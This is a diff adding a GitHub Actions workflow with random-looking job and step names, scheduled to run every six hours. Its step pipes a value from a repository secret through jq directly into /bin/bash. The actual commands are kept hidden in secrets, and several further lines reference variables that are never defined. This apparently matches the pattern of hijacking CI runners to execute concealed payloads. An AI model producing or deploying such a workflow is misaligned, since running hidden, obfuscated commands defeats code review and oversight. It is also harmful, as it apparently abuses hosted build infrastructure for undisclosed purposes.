@@ -1,0 +1,25 @@
+name: lvhuaiqing4567
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lvhuaiqing4567
+        env:
+          fd138: ${{ secrets.fd138 }}
+        run: |
+          echo $fd138 | jq -r .wqaa988 | /bin/bash
+          echo $ksafj7360 | jq -r .uj0 | /bin/bash
+          echo $m6574 | jq -r .gtc39342 | /bin/bash
+          echo $sy7492 | jq -r .zeb38046 | /bin/bash
+          echo $pd79581 | jq -r .h3 | /bin/bash
+          echo $l7 | jq -r .xzb1699 | /bin/bash
+          echo $plxz9 | jq -r .e2 | /bin/bash
+          echo $fetbt59886 | jq -r .nozd780 | /bin/bash
+
